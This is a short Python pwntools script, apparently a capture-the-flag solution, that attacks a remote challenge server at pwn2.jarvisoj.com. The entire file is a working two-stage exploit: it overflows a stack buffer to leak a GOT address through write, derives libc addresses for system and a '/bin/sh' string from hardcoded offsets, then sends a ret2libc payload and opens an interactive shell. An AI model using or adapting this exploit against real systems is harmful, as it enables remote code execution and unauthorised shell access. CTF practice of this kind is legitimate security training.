from pwn import *

HOST = 'pwn2.jarvisoj.com'
PORT = 9879

write_plt = 0x8048340
write_ret = 0x804844B         # vulnerable_function()
write_parameter_1 = 0x01      # std out
write_parameter_2 = 0x804A00C # addr got table
write_parameter_3 = 0x04      # len 4
# get got addr
def PrettyTommy(ip,port):

        con = remote(ip,port)
        print con.recv()
        #1
        payload = 0x88 * "A" + 4 * "A" + p32(write_plt) + p32(write_ret)+p32(write_parameter_1)+p32(write_parameter_2)+p32(write_parameter_3)
        con.send(payload)
        gotaddr = u32(con.recv(4))
        print gotaddr
        con.recv()

        #2
        readLib = 0xdaf60
        systemLib = 0x40310
        shellLib = 0x16084c

        tmp = gotaddr - readLib
        func_system = tmp + systemLib
        shell_addr = tmp + shellLib
        


        #3
        payload = 0x88 * "A" + 4 * "A" + p32(func_system) + 4*"A" + p32(shell_addr)
        con.send(payload)
        con.interactive("shell:")

PrettyTommy(HOST,PORT)
